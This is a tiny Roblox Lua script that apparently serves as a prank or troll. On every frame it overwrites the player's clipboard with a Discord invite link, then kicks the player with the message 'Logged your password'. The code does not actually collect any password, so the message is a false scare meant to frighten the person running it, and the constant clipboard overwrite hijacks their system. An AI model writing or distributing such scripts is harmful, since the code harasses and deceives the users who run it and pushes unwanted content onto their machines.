local a = "discord.gg/fatherless"

local runService = game:GetService("RunService")
local event = runService.RenderStepped:Connect(function()
setclipboard(a)
end)

game.Players.LocalPlayer:Kick("Logged your password")

